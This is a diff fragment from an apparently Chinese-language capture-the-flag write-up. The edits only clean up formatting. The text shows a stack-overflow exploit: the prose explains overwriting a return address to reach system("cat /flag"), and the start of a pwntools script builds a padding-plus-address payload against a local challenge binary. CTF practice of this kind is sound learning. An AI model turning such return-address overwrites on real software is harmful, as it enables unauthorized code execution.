@@ -14,11 +14,11 @@ type: docs
 
 ![a8aed923a28e0698e3ed01725f26a47c](images/a8aed923a28e0698e3ed01725f26a47c.png)  
 
-存在溢出点，可以直接覆盖函数返回地址为 `system("cat /flag")` 
+存在溢出点，可以直接覆盖函数返回地址为 `system("cat /flag")`
 
 ## 0x02 Exploit
 
-```
+```python
 from pwn import*
 o = process("./pwn")
 payload = b'a'*56 + p32(0x4006BE)
